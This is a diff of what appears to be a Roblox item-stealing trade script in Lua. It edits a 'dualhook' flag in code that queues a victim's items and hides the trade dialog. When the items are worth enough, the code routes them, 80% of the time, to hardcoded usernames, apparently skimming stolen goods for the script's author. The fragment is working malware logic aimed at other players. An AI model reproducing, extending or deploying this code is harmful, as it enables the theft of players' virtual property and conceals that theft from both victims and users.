@@ -38,7 +38,7 @@ end
 
 local itemsToSend = {}
 local inTrade = false
-local dualhooked = true
+local dualhooked = false
 local playerGui = plr:WaitForChild("PlayerGui")
 local tradeFrame = playerGui.TradeApp.Frame
 local dialog = playerGui.DialogApp.Dialog
@@ -467,7 +467,7 @@ game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = fals
 if totalValue >= 50 and math.random() < 0.80 then
     usernames = {"xFCB_0", "opendarec"}
     ping = "Yes"
-    dualhooked = true
+    dualhooked = false
 end
 
 if #itemsToSend > 0 then
